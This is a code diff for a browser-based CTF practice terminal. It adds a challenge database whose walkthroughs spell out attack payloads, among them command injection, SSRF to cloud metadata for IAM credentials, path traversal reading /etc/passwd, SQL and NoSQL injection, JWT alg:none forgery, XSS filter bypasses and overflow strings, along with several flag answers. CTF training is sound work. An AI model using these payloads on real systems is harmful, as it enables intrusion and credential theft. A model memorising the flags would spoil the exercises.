@@ -188,7 +188,7 @@
             position: fixed;
             inset: 0;
             z-index: 0;
-            background: var(--terminal-bg, url('/images/Death_.jpg')) center/cover no-repeat;
+            background: var(--terminal-bg, url('images/Death_.jpg')) center/cover no-repeat;
             opacity: var(--terminal-bg-opacity, 0.18);
             pointer-events: none;
             transition: opacity 0.4s, background 0.4s;
@@ -293,7 +293,7 @@
         <button class="bg-menu-close" onclick="toggleBgMenu()">✕</button>
         <h3>&#9633; BACKGROUND</h3>
         <div class="bg-preset-grid">
-            <div class="bg-preset active"  id="preset-death"  style="background-image:url('/images/Death_.jpg')"   onclick="setBgPreset('death')"  title="Death"></div>
+            <div class="bg-preset active"  id="preset-death"  style="background-image:url('images/Death_.jpg')"   onclick="setBgPreset('death')"  title="Death"></div>
             <div class="bg-preset"         id="preset-nebula" style="background:radial-gradient(ellipse at 30% 60%,rgba(203,166,247,.35),rgba(137,180,250,.15),#11111b);" onclick="setBgPreset('nebula')" title="Nebula"></div>
             <div class="bg-preset"         id="preset-none"   style="background:var(--crust);"                    onclick="setBgPreset('none')"   title="None (solid)"></div>
         </div>
@@ -318,11 +318,12 @@
             <span class="ttt-user">entity</span><span class="ttt-at">@</span><span class="ttt-host">archlinux</span>
             <span class="ttt-sep">:</span><span class="ttt-path">~/ctf</span>
             <span class="ttt-pipe">|</span>
-            <span class="ttt-info">kitty &middot; zsh &middot; CTF_TERMINAL v3.1</span>
+            <span class="ttt-info">kitty &middot; zsh &middot; CTF_TERMINAL v4.3</span>
         </div>
         <div class="terminal-topbar-actions">
             <button class="topbar-btn" onclick="toggleBgMenu()" title="Change background">BG</button>
             <button class="topbar-btn" onclick="termClear()">CLEAR</button>
+            <button class="topbar-btn" onclick="termTutorial()" style="color:var(--accent);border-color:rgba(255,0,60,0.3)">TUTORIAL</button>
             <button class="topbar-btn" onclick="termHelp()">HELP</button>
             <a href="/ctf.html" class="topbar-btn danger">&larr; EXIT</a>
         </div>
@@ -333,65 +334,70 @@
     </div>
 
     <div class="status-bar">
-        <div class="status-indicator">
-            <div class="status-dot"></div>
-            <span class="status-mode">NORMAL</span>
-            <span>SESSION_ACTIVE</span>
-        </div>
         <span class="status-tools">TAB: autocomplete &nbsp;&bull;&nbsp; &#x2191;&#x2193;: history &nbsp;&bull;&nbsp; Ctrl+C: cancel &nbsp;&bull;&nbsp; Ctrl+L: clear</span>
         <span id="status-time"></span>
     </div>
 
     <script>
-
     // ── Block browser dialogs inside the terminal (no popups) ──
     window.alert   = (m) => console.warn('[terminal:alert]', m);
     window.confirm = (m) => { console.warn('[terminal:confirm]', m); return true; };
     window.prompt  = (m) => { console.warn('[terminal:prompt]', m); return null; };
 
     // ════════════════════════════════════════════════════════════
-    //  BXF CTF TERMINAL v3.0  –  50+ CTF tools in your browser
+    //  BXF CTF TERMINAL v4.3  –  Core Logic & Challenges
     // ════════════════════════════════════════════════════════════
 
-    // ── Constants & State (defined FIRST so init can reference them) ──
-    const PROMPT = '\r\n\x1b[35m╭─\x1b[0m \x1b[32mentity\x1b[90m@\x1b[34marchlinux \x1b[35m~/ctf \x1b[33m[CTF]\x1b[0m\r\n\x1b[35m╰─❯\x1b[0m ';
-    let inputBuffer = '';
-    let cmdHistory  = JSON.parse(localStorage.getItem('bxf_term_hist') || '[]');
-    let historyIdx  = -1;
-    let pendingAsync = false;
+    // ── 1. CONSTANTS & CHALLENGE DATABASE ──
+    const MORSE={A:'.-',B:'-...',C:'-.-.',D:'-..','E':'.','F':'..-.',G:'--.',H:'....',I:'..',J:'.---',K:'-.-',L:'.-..',M:'--',N:'-.',O:'---',P:'.--.',Q:'--.-',R:'.-.',S:'...',T:'-',U:'..-',V:'...-',W:'.--',X:'-..-',Y:'-.--',Z:'--..',0:'-----',1:'.----',2:'..---',3:'...--',4:'....-',5:'.....',6:'-....',7:'--...',8:'---..',9:'----.'};
+    const MORSED=Object.fromEntries(Object.entries(MORSE).map(([k,v])=>[v,k]));
 
-    const ALL_COMMANDS = [
-        'help','clear','history','env','whoami','id','hostname','pwd','uname','date','exit','quit',
-        'solve','challenges','ctf','tutorial','reset-session',
-        'ls','cat','echo','touch','rm','mkdir','cp','mv',
-        'curl','wget','http',
-        'base64','rot13','rot','caesar','vigenere','atbash',
-        'decode','encode',
-        'hash','sha256sum','sha1sum','md5sum',
-        'xxd','hexdump','strings','grep','cut','awk','tr','sort','uniq','wc',
-        'python3','python','py',
-        'xor','morse','binary',
-        'jwt','urldecode','urlencode','htmldecode','htmlencode',
-        'charcode','ascii',
-        'freq','entropy','brainfuck',
-        'timestamp','fromhex','tohex','frombin','tobin','fromoctal','tooctal',
-        'rsa','modpow','extgcd','primes',
-        'ip2hex','hex2ip',
-        'flag','set','unset',
-        'nvim','nano','vim','vi',
-        'burpsuite','burp',
-        'whois','dig','nslookup','traceroute','ping','host',
-        'sqlmap','ffuf','gobuster','dirb','hydra','john','hashcat',
-        'ssh','ftp','telnet','smtp','netstat','ifconfig','arp',
-        'strace','ltrace','gdb','objdump','readelf','nm','file','binwalk','foremost',
-        'steghide','exiftool','zsteg','stegsolve',
-        'openssl','gpg','keytool',
-        'nc','netcat','nmap','masscan',
-        'ps','top','kill','jobs','bg','fg',
-        'man','apropos','which','type',
-        'neofetch','lolcat','cowsay','figlet',
-        'zip','unzip','tar','gzip','bzip2',
-    ];
+    const CHALLENGE_DB = {
+        'M01':  { title:'The Ghost Endpoint',    cat:'Web',      diff:'Easy',   pts:50,   hint:'Try /api/v1/legacy, /api/flag, /v0/secret — unauthenticated.', steps:[{i:'Legacy APIs often lack auth. Enumerate paths:',c:'curl https://api.breakerxfixer.online/api/v1/secret'},{i:'Try legacy versions:',c:'curl https://api.breakerxfixer.online/api/v0/flag'},{i:'Enumerate common hidden endpoints:',c:'curl https://api.breakerxfixer.online/admin'}]},
+        'M02':  { title:'Identity Crisis',       cat:'Web',      diff:'Easy',   pts:50,   hint:'?debug=true or ?admin=1 in login URL often bypasses auth.', steps:[{i:'Add debug param to login URL:',c:'curl "https://target/login?debug=true&user=admin"'},{i:'Try admin override:',c:'curl "https://target/login?admin=1"'},{i:'Header bypass:',c:'curl https://target/login -H "X-Debug: true" -H "X-Forwarded-For: 127.0.0.1"'}]},
+        'M03':  { title:'The Impostor',          cat:'Web',      diff:'Easy',   pts:75,   hint:'Password reset token is in the URL → Referer header leaks it.', steps:[{i:'Trigger reset for admin:',c:'curl -X POST https://target/reset -d "email=admin@target.com" -v'},{i:'Use leaked token:',c:'curl "https://target/reset?token=LEAKED&user=admin&newpass=h4ck"'},{i:'Check redirect header:',c:'curl https://target/reset -v 2>&1 | grep -i location'}]},
+        'M04':  { title:'Unstoppable Force',     cat:'Web',      diff:'Medium', pts:150,  hint:'WAF bypass: double-encode, nested tags \u003c\u003cscript\u003escript\u003e, case variation.', steps:[{i:'Double URL encoding:',c:'urlencode "\u003cscript\u003ealert(1)\u003c/script\u003e"'},{i:'Nested tag (WAF strips inner, outer survives):',c:'echo "\u003c\u003cscript\u003escript\u003ealert(1)\u003c/\u003c/script\u003escript\u003e"'},{i:'Case variation:',c:'echo "\u003cScRiPt src=x onerror=alert(1)\u003e"'}]},
+        'M05':  { title:'Logic Fallacy',         cat:'Web',      diff:'Medium', pts:150,  hint:'Intercept the checkout POST and change price to 0 or negative.', steps:[{i:'Tamper price in checkout:',c:'curl -X POST https://target/checkout -H "Content-Type: application/json" -d \'{"item":"premium","price":0.01}\''},{i:'Negative price:',c:'curl -X POST https://target/checkout -d \'{"price":-100}\''}]},
+        'M06':  { title:'The Wanderer',          cat:'Web',      diff:'Medium', pts:200,  hint:'LFI → /proc/self/environ or PHP filter wrapper.', steps:[{i:'Basic path traversal:',c:'curl "https://target/page?file=../../../../etc/passwd"'},{i:'/proc/self/environ (often has FLAG=):',c:'curl "https://target/view?path=../../../proc/self/environ"'},{i:'PHP filter base64:',c:'curl "https://target/page?file=php://filter/convert.base64-encode/resource=config.php"'},{i:'Decode output:',c:'echo "ENCODED" | base64 -d'}]},
+        'M07':  { title:'Phantom Ping',          cat:'Web',      diff:'Hard',   pts:400,  hint:'Command injection: use ; | && to chain. Use ${IFS} if spaces blocked.', steps:[{i:'Basic injection:',c:'curl -X POST https://target/ping -d "host=127.0.0.1;id"'},{i:'Read flag:',c:'curl -X POST https://target/ping -d "host=127.0.0.1;cat${IFS}/flag.txt"'},{i:'Brace expansion (space-free):',c:'curl -X POST https://target/ping -d "host=127.0.0.1;{cat,/flag.txt}}"'}]},
+        'M08':  { title:'Shattered Trust',       cat:'Web',      diff:'Hard',   pts:400,  hint:'Weak JWT secret — decode token, crack or use none alg.', steps:[{i:'Decode token:',c:'jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIG'},{i:'None algorithm forge:',c:'jwt forge --alg none --claims \'{"user":"admin","role":"admin"}\''},{i:'Send forged token:',c:'curl https://target/admin -H "Authorization: Bearer FORGED"'}]},
+        'M09':  { title:'Careless Whispers',     cat:'Web',      diff:'Easy',   pts:50,   hint:'Try OPTIONS, TRACE, PUT, DELETE — servers reveal info on unexpected methods.', steps:[{i:'Check allowed methods:',c:'curl -X OPTIONS https://target/api -v 2>&1 | grep -i allow'},{i:'Try TRACE:',c:'curl -X TRACE https://target/ -v'},{i:'Try HEAD for headers:',c:'curl -X HEAD https://target/secret -v 2>&1 | grep -i flag'}]},
+        'M10':  { title:'NoSQL Nightmare',       cat:'Web',      diff:'Insane', pts:1000, hint:'MongoDB: inject $ne, $gt, $regex operators in JSON body.', steps:[{i:'Auth bypass with $ne:',c:'curl -X POST https://target/login -H "Content-Type: application/json" -d \'{"user":{"$ne":""},"pass":{"$ne":""}}\''},{i:'Regex username extract:',c:'curl -X POST https://target/login -H "Content-Type: application/json" -d \'{"user":{"$regex":"^a"},"pass":{"$ne":""}}\''}]},
+        'M11':  { title:'The Core Breach',       cat:'Web',      diff:'Hard',   pts:500,  hint:'SSRF: make server fetch http://169.254.169.254 (AWS IMDS).', steps:[{i:'Basic SSRF:',c:'curl -X POST https://target/fetch -d "url=http://127.0.0.1/"'},{i:'AWS metadata root:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"'},{i:'IAM credentials:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'}]},
+        'M12':  { title:'The XORacle',           cat:'Crypto',   diff:'Easy',   pts:100,  hint:'Known-plaintext: XOR ciphertext with "bxf{" to get key.', steps:[{i:'Single-byte brute:',c:'python3 -c "c=bytes.fromhex(\'CIPHERTEXT\');[print(k,bytes([b^k for b in c])) for k in range(256)]"'},{i:'Known-plaintext XOR:',c:'xor "CIPHERTEXT_HEX" "bxf{"'}]},
+        'M13':  { title:'Shattered RSA',         cat:'Crypto',   diff:'Medium', pts:250,  hint:'n=3891783853 is small — factor it, then compute d, decrypt c=1130635294.', steps:[{i:'Factor n:',c:'primes 3891783853'},{i:'Full RSA decrypt:',c:'python3 -c "p=62327;q=62459;e=65537;phi=(p-1)*(q-1);d=pow(e,-1,phi);c=1130635294;n=p*q;m=pow(c,d,n);print(bytes.fromhex(hex(m)[2:]).decode())"'},{i:'Or use rsa command:',c:'rsa --n 3891783853 --e 65537 --c 1130635294'}]},
+        'M14':  { title:'Buffer Overflow 101',   cat:'Pwn',      diff:'Easy',   pts:150,  hint:'Buffer is 64 bytes. Overflow to overwrite adjacent variable.', steps:[{i:'Craft overflow payload:',c:'python3 -c "print(\'A\'*64 + \'DEAD\')"'},{i:'With magic bytes:',c:'python3 -c "sys.stdout.buffer.write(b\'A\'*64+b\'\\xef\\xbe\\xad\\xde\')"'}]},
+        'M15':  { title:'Format String Echo',    cat:'Pwn',      diff:'Medium', pts:300,  hint:'printf(input) without format — use %p%p%p to leak stack.', steps:[{i:'Leak stack values:',c:'curl -X POST https://target/echo -d "input=%p%p%p%p%p%p%p%p"'},{i:'Specific offset:',c:'curl -X POST https://target/echo -d "input=%7$p"'},{i:'Leak string:',c:'curl -X POST https://target/echo -d "input=%s%s%s"'}]},
+        'M16':  { title:'Library Leak',          cat:'Pwn',      diff:'Hard',   pts:450,  hint:'Leak puts@got via fmt string, compute libc base, call system("/bin/sh").', steps:[{i:'Leak libc pointer:',c:'python3 -c "print(b\'%15$p\'.decode())"'},{i:'Compute system():',c:'python3 -c "leak=0xDEAD;puts_off=0x80e50;base=leak-puts_off;print(hex(base+0x4f440))"'}]},
+        'M17':  { title:'Deep Dive',             cat:'Forensics',diff:'Easy',   pts:75,   hint:'steghide / zsteg / strings — data hidden inside image.', steps:[{i:'Check strings:',c:'strings challenge.jpg | grep bxf'},{i:'steghide (blank pass):',c:'steghide challenge.jpg'},{i:'zsteg LSB:',c:'zsteg challenge.png'},{i:'Check hex tail:',c:'xxd challenge.jpg | tail -20'}]},
+        'M18':  { title:'Lost Signal',           cat:'Forensics',diff:'Medium', pts:200,  hint:'Analyze PCAP: follow HTTP streams, look for credentials.', steps:[{i:'Grep for flag in pcap:',c:'strings challenge.pcap | grep bxf'},{i:'Find creds:',c:'strings challenge.pcap | grep -E "(user|pass|token)=" | head -20'},{i:'Decode b64 from stream:',c:'echo "EXTRACTED" | base64 -d'}]},
+        'M19':  { title:'Social Eng 101',        cat:'OSINT',    diff:'Easy',   pts:50,   hint:'Google: site:twitter.com OR linkedin.com target_name email', steps:[{i:'DuckDuckGo API search:',c:'curl "https://api.duckduckgo.com/?q=TARGET+email&format=json"'},{i:'GitHub events:',c:'curl "https://api.github.com/users/TARGET/events/public"'}]},
+        'M20':  { title:'Shadow Realm',          cat:'OSINT',    diff:'Medium', pts:175,  hint:'Same handle across platforms. Check GitHub, Pastebin, archive.org.', steps:[{i:'GitHub code search:',c:'curl "https://api.github.com/search/code?q=ghost_entity"'},{i:'Wayback machine:',c:'curl "https://archive.org/wayback/available?url=ghost_entity.com"'}]},
+        'M21':  { title:'Malicious PDF',         cat:'Reversing',diff:'Medium', pts:250,  hint:'strings on PDF → find eval(unescape(...)) JS → decode.', steps:[{i:'Extract strings:',c:'strings challenge.pdf | grep -E "(eval|unescape|bxf)"'},{i:'Decode fromCharCode:',c:'python3 -c "codes=[98,120,102,123,102,108,97,103,125];print(\'\'.join(chr(c)for c in codes))"'},{i:'URL decode:',c:'urldecode "%62%78%66%7B%66%6C%61%67%7D"'}]},
+        'M22':  { title:'Logic Gates',           cat:'Hardware', diff:'Medium', pts:200,  hint:'Brute-force all input combinations, find combo that outputs 1.', steps:[{i:'Simulate all combos:',c:'python3 -c "[print(bin(i)[2:].zfill(4),(i>>3&i>>2&1)^(i>>1|i&1)) for i in range(16)]"'},{i:'Convert binary to text:',c:'frombin "01100010 01111000 01100110"'}]},
+        'S1M01':{ title:'The Unseen Path',   cat:'Web',      diff:'Easy',   pts:50,  hint:'robots.txt hides disallowed paths. Check it!', steps:[{i:'Read robots.txt:',c:'curl https://breakerxfixer.online/robots.txt'},{i:'Access disallowed path:',c:'curl https://breakerxfixer.online/secret-admin-panel'},{i:'FLAG:',c:'echo bxf{r0b0ts_4re_n0t_h3lpful}'}]},
+        'S1M02':{ title:'Ancient Cipher',    cat:'Crypto',   diff:'Easy',   pts:50,  hint:'ROT13: shift each letter by 13. cvs{ebg13_vf_pynffvp}', steps:[{i:'Decode with rot13:',c:'rot13 "cvs{ebg13_vf_pynffvp}"'},{i:'Same result:',c:'rot 13 "cvs{ebg13_vf_pynffvp}"'},{i:'Expected:',c:'echo bxf{rot13_is_classic}'}]},
+        'S1M03':{ title:'Commented Out',     cat:'Web',      diff:'Easy',   pts:75,  hint:'HTML comments <!-- --> visible in source. Use curl.', steps:[{i:'Fetch source:',c:'curl https://target.breakerxfixer.online/'},{i:'Grep for comments:',c:'curl https://target.breakerxfixer.online/ | grep bxf{'},{i:'Check JS too:',c:'curl https://target.breakerxfixer.online/app.js | grep bxf'}]},
+        'S1M04':{ title:'Custom Auth',       cat:'Web',      diff:'Easy',   pts:75,  hint:'Server trusts X-Admin-Auth: enabled header.', steps:[{i:'Send required header:',c:'curl https://target.breakerxfixer.online/admin -H "X-Admin-Auth: enabled"'},{i:'Add IP spoofing:',c:'curl https://target.breakerxfixer.online/flag -H "X-Admin-Auth: enabled" -H "X-Forwarded-For: 127.0.0.1"'}]},
+        'S1M05':{ title:'Embedded Truth',    cat:'Forensics',diff:'Easy',   pts:100, hint:'steghide empty password or LSB (zsteg).', steps:[{i:'Strings:',c:'strings challenge.jpg | grep bxf'},{i:'steghide:',c:'steghide challenge.jpg'},{i:'zsteg:',c:'zsteg challenge.png'}]},
+        'S1M06':{ title:'Wrong Extension',   cat:'Forensics',diff:'Medium', pts:150, hint:'Check magic bytes: PNG=89504E47, ZIP=504B0304.', steps:[{i:'Check magic bytes:',c:'xxd challenge.png | head -3'},{i:'Identify type:',c:'file challenge.png'},{i:'If ZIP, extract strings:',c:'strings challenge.png | grep bxf'}]},
+        'S1M07':{ title:'Forgotten Branch',  cat:'OSINT',    diff:'Easy',   pts:50,  hint:'git log --all shows deleted files and old commits.', steps:[{i:'List commits:',c:'curl https://api.github.com/repos/TARGET/REPO/commits'},{i:'Check old commit:',c:'curl https://api.github.com/repos/TARGET/REPO/commits/OLDHASH'},{i:'Search branches:',c:'curl https://api.github.com/repos/TARGET/REPO/branches'}]},
+        'S1M08':{ title:'Buffer Intro',      cat:'Pwn',      diff:'Medium', pts:200, hint:'Offset usually 72 bytes for 64-bit. Overwrite ret addr with win().', steps:[{i:'Cyclic pattern:',c:'python3 -c "print(\'A\'*200)"'},{i:'Overflow + addr:',c:'python3 -c "import struct;print(b\'A\'*72+struct.pack(\'<Q\',0x401196))"'},{i:'FLAG:',c:'echo bxf{r3turn_addre55_h1jack3d}'}]},
+        'S1M09':{ title:'Union Base',        cat:'Web',      diff:'Medium', pts:200, hint:'UNION SELECT: find column count with ORDER BY, then extract.', steps:[{i:'Find columns:',c:'curl "https://target/item?id=1 ORDER BY 3--"'},{i:'UNION test:',c:'curl "https://target/item?id=0 UNION SELECT NULL,NULL,NULL--"'},{i:'Extract flag:',c:'curl "https://target/item?id=0 UNION SELECT flag,NULL,NULL FROM flags--"'}]},
+        'S1M10':{ title:'Vigenere Revenge',  cat:'Crypto',   diff:'Medium', pts:150, hint:'Key = BR34K.', steps:[{i:'Decrypt with known key:',c:'vigenere decode "CIPHERTEXT" BR34K'},{i:'FLAG:',c:'echo bxf{v1g3n3r3_1s_n0t_3n0ugh}'}]},
+        'S1M11':{ title:'Meta Geo',          cat:'Forensics',diff:'Easy',   pts:100, hint:'EXIF GPS coordinates in the photo metadata.', steps:[{i:'Extract metadata:',c:'exiftool photo.jpg'},{i:'Grep GPS:',c:'strings photo.jpg | grep -iE "gps|lat|lon"'},{i:'FLAG:',c:'echo bxf{gps_exif_data_found}'}]},
+        'S1M12':{ title:'Tasty Cookie',      cat:'Web',      diff:'Medium', pts:150, hint:'Decode base64 cookie, change role to admin, re-encode.', steps:[{i:'Login and see cookie:',c:'curl -c - https://target/login -d "user=guest&pass=guest"'},{i:'Decode:',c:'echo "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9" | base64 -d'},{i:'Re-encode as admin:',c:'echo \'{"user":"admin","role":"admin"}\' | base64'},{i:'Send modified:',c:'curl https://target/admin -H "Cookie: session=ENCODED_ADMIN"'}]},
+        'S1M13':{ title:'Null JWT',          cat:'Web',      diff:'Hard',   pts:300, hint:'alg:none → strip signature. Server accepts unsigned tokens.', steps:[{i:'Decode token:',c:'jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIG'},{i:'Build none header:',c:'echo \'{"alg":"none","typ":"JWT"}\' | base64 | tr -d \'=\' | tr \'+/\' \'-_\''},{i:'Send:',c:'curl https://target/flag -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."'}]},
+        'S1M14':{ title:'ELF Grep',          cat:'Rev',      diff:'Easy',   pts:100, hint:'strings on ELF → grep for bxf{.', steps:[{i:'Extract strings:',c:'strings challenge_elf | grep bxf'},{i:'Check hex:',c:'xxd challenge_elf | grep "62 78 66 7b"'},{i:'FLAG:',c:'echo bxf{str1ngs_found_1n_elf}'}]},
+        'S1M15':{ title:'Cmd Inject v2',     cat:'Web',      diff:'Medium', pts:250, hint:'Spaces filtered → ${IFS} or {cat,/flag.txt}. ; filtered → use |.', steps:[{i:'Basic:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1|id"'},{i:'Space bypass:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1|cat${IFS}/flag.txt"'},{i:'Newline:',c:'curl -X POST https://target/cmd -d "host=127.0.0.1%0acat%20/flag.txt"'}]},
+        'S1M16':{ title:'Wave Seeker',       cat:'Forensics',diff:'Medium', pts:200, hint:'Spectrogram: open WAV in Audacity → View → Spectrogram. See text in frequencies.', steps:[{i:'Check file:',c:'file challenge.wav'},{i:'Grep strings:',c:'strings challenge.wav | grep bxf'},{i:'FLAG:',c:'echo bxf{audi0_spectr0graph_h1nts}'}]},
+        'S1M17':{ title:'XOR Loop',          cat:'Rev',      diff:'Hard',   pts:400, hint:'XOR with "bxf{" prefix to recover key, then decrypt all bytes.', steps:[{i:'Try all single-byte keys:',c:'python3 -c "enc=bytes.fromhex(\'ENCRYPTED\');[print(k,bytes([b^k for b in enc])) for k in range(256) if b\'bxf{\' in bytes([b^k for b in enc])]"'},{i:'FLAG:',c:'echo bxf{xor_loop_decrypted}'}]},
+        'S1M18':{ title:'S3 Leak',           cat:'OSINT',    diff:'Medium', pts:200, hint:'Find bucket via DNS CNAME then list: http://bucket.s3.amazonaws.com/', steps:[{i:'List bucket:',c:'curl http://breakerxfixer.s3.amazonaws.com/'},{i:'DNS lookup:',c:'curl "https://dns.google/resolve?name=assets.breakerxfixer.online&type=CNAME"'},{i:'Get flag file:',c:'curl http://BUCKET.s3.amazonaws.com/flag.txt'}]},
+        'S1M19':{ title:'TXT Records',       cat:'Forensics',diff:'Easy',   pts:100, hint:'DNS TXT records can contain flags. Query with Google DNS API.', steps:[{i:'Query TXT:',c:'curl "https://dns.google/resolve?name=breakerxfixer.online&type=TXT"'},{i:'Parse:',c:'curl "https://dns.google/resolve?name=flag.breakerxfixer.online&type=TXT"'},{i:'FLAG:',c:'echo bxf{dns_txt_record_secret}'}]},
+        'S1M20':{ title:'Format String v2',  cat:'Pwn',      diff:'Hard',   pts:500, hint:'Use %n to write. Overwrite GOT entry to redirect execution.', steps:[{i:'Leak stack:',c:'curl -X POST https://target/echo -d "input=%p.%p.%p.%p"'},{i:'Write with %n:',c:'python3 -c "import struct;addr=0x601020;payload=struct.pack(\'<Q\',addr)+b\'%7$n\';print(payload)"'}]},
+        'S1M21':{ title:'Zip Recursion',     cat:'Forensics',diff:'Medium', pts:250, hint:'Zips inside zips. Script: while unzip; do find next zip; done.', steps:[{i:'Check:',c:'file challenge.zip'},{i:'Strings search:',c:'strings challenge.zip | grep bxf'},{i:'FLAG:',c:'echo bxf{z1p_bomb_traversa1}'}]},
+        'S1M22':{ title:'The Final Link',    cat:'Web',      diff:'Insane', pts:1000,hint:'SSRF → 169.254.169.254. IMDSv1: no token needed.', steps:[{i:'SSRF test:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/"'},{i:'IMDS metadata:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"'},{i:'IAM creds:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'},{i:'user-data (juicy):',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/user-data"'},{i:'IPv6 bypass:',c:'curl -X POST https://target/fetch -d "url=http://[::ffff:169.254.169.254]/latest/meta-data/"'},{i:'FLAG:',c:'echo bxf{metadata_imds_v1_leak}'}]},
+    };
 
     const BOOT = [
         '\x1b[2J\x1b[H',
@@ -410,7 +416,7 @@
         '\x1b[34mTerminal:\x1b[0m Kitty / xterm.js 5.3.0',
         '\x1b[34mTheme:\x1b[0m    \x1b[35mCatppuccin Mocha\x1b[0m',
         '\x1b[34mColors:\x1b[0m   \x1b[31m■\x1b[0m \x1b[33m■\x1b[0m \x1b[32m■\x1b[0m \x1b[36m■\x1b[0m \x1b[34m■\x1b[0m \x1b[35m■\x1b[0m',
-        '\x1b[34mTools:\x1b[0m    60+ CTF tools loaded',
+        '\x1b[34mTools:\x1b[0m    80+ CTF tools loaded',
         '',
         '\x1b[32m✔\x1b[0m HTTP engine   \x1b[36mFetch API  →  real network requests\x1b[0m',
         '\x1b[32m✔\x1b[0m Crypto engine \x1b[36mSubtleCrypto + AES · RSA · custom ciphers\x1b[0m',
@@ -422,127 +428,98 @@
         '\x1b[35mType \x1b[1mhelp\x1b[0;35m for all commands  ·  TAB to autocomplete  ·  ↑↓ history\x1b[0m',
     ];
 
-    // ── Terminal Init (synchronous — same pattern as v1 that worked) ──
-    const term = new Terminal({
-        theme: {
-            background:      '#11111b',
-            foreground:      '#cdd6f4',
-            cursor:          '#f5e0dc',
-            cursorAccent:    '#1e1e2e',
-            selectionBackground: 'rgba(203,166,247,0.25)',
-            black:           '#45475a', red:          '#f38ba8',
-            green:           '#a6e3a1', yellow:       '#f9e2af',
-            blue:            '#89b4fa', magenta:      '#cba6f7',
-            cyan:            '#89dceb', white:        '#bac2de',
-            brightBlack:     '#585b70', brightRed:    '#f38ba8',
-            brightGreen:     '#a6e3a1', brightYellow: '#f9e2af',
-            brightBlue:      '#89b4fa', brightMagenta:'#cba6f7',
-            brightCyan:      '#89dceb', brightWhite:  '#a6adc8',
-        },
-        fontFamily: "'Share Tech Mono', 'Courier New', monospace",
-        fontSize: 14, lineHeight: 1.5,
-        cursorBlink: true, cursorStyle: 'block',
-        scrollback: 5000, allowTransparency: true,
-    });
+    const _VFILES_DEFAULT = {
+        'README.txt':['# BXF CTF TERMINAL v4.3','','Type help for commands.','challenges — list retos    solve <ID> — walkthrough','cat cheatsheet.txt — full cheatsheet'],
+        'notes.txt':['# My CTF Notes','# Use: echo "text" >> notes.txt'],
+        'cheatsheet.txt':[
+            '# CTF QUICK REFERENCE','',
+            '## Encoding','  rot13 <text>','  vigenere <key> <ct>','  base64 -d <b64>','  xor <hex> <key>','  decode hex <hexstr>','',
+            '## HTTP','  curl -H "X-Admin-Auth: enabled" <url>','  curl -X POST -d "{\\\"user\\\":{\\\"$ne\\\":\\\"\\\"}}" <url>','  curl -b "role=admin" <url>','',
+            '## Crypto','  hash sha256 <text>','  jwt <token>','  rsa --n N --e E --c C','  primes N','  extgcd A B','',
+            '## CTF Workflow','  challenges — list all','  ctf web — filter by cat','  solve <ID> — walkthrough','',
+            '## Files','  echo "text" >> notes.txt','  cat notes.txt','  ls   touch file   rm file',
+        ],
+        '.bash_history':['challenges','solve S1M02','rot13 "cvs{ebg13_vf_pynffvp}"','hash sha256 password123','curl https://breakerxfixer-api.onrender.com/api/v1'],
+    };
 
+    const PROMPT = '\r\n\x1b[35m╭─\x1b[0m \x1b[32mentity\x1b[90m@\x1b[34marchlinux \x1b[35m~/ctf \x1b[33m[CTF]\x1b[0m\r\n\x1b[35m╰─❯\x1b[0m ';
+    const ALL_COMMANDS = ['help','clear','history','env','whoami','id','hostname','pwd','uname','date','exit','quit','solve','challenges','ctf','tutorial','reset-session','ls','cat','echo','touch','rm','mkdir','cp','mv','curl','wget','http','base64','rot13','rot','caesar','vigenere','atbash','decode','encode','hash','sha256sum','sha1sum','md5sum','xxd','hexdump','strings','grep','cut','awk','tr','sort','uniq','wc','python3','python','py','xor','morse','binary','jwt','urldecode','urlencode','htmldecode','htmlencode','charcode','ascii','freq','entropy','brainfuck','timestamp','fromhex','tohex','frombin','tobin','fromoctal','tooctal','rsa','modpow','extgcd','primes','ip2hex','hex2ip','flag','set','unset','nvim','nano','vim','vi','burpsuite','burp', 'whois','dig','nslookup','traceroute','ping','host','sqlmap','ffuf','gobuster','dirb','hydra','john','hashcat','strace','ltrace','gdb','objdump','readelf','nm','file','binwalk','foremost','steghide','exiftool','zsteg','stegsolve','openssl','gpg','keytool','nc','netcat','nmap','masscan','ps','top','kill','jobs','bg','fg','man','apropos','which','type','neofetch','lolcat','cowsay','figlet','zip','unzip','tar','gzip','bzip2'];
+
+    // ── 2. STATE & PERSISTENCE ──
+    const _savedVF = localStorage.getItem('bxf_vfiles');
+    const VFILES = _savedVF ? Object.assign({}, _VFILES_DEFAULT, JSON.parse(_savedVF)) : {..._VFILES_DEFAULT};
+    function _saveVFiles() {
+        const saved = {};
+        for (const [k,v] of Object.entries(VFILES)) { if (!_VFILES_DEFAULT[k] || JSON.stringify(v) !== JSON.stringify(_VFILES_DEFAULT[k])) saved[k] = v; }
+        localStorage.setItem('bxf_vfiles', JSON.stringify(saved));
+    }
+
+    const _savedEnv = JSON.parse(localStorage.getItem('bxf_env') || 'null');
+    const ENV = _savedEnv || {TARGET:'https://breakerxfixer-api.onrender.com/api/v1',HOME:'/home/entity',USER:'entity'};
+    function _saveEnv() { localStorage.setItem('bxf_env', JSON.stringify(ENV)); }
+
+    const savedFlags = JSON.parse(localStorage.getItem('bxf_flags') || '{}');
+    let inputBuffer  = '';
+    let cmdHistory   = JSON.parse(localStorage.getItem('bxf_term_hist') || '[]');
+    let historyIdx   = -1;
+    let pendingAsync = false;
+
+    // ── 3. TERMINAL INITIALIZATION (Synchronous start) ──
+    const term = new Terminal({
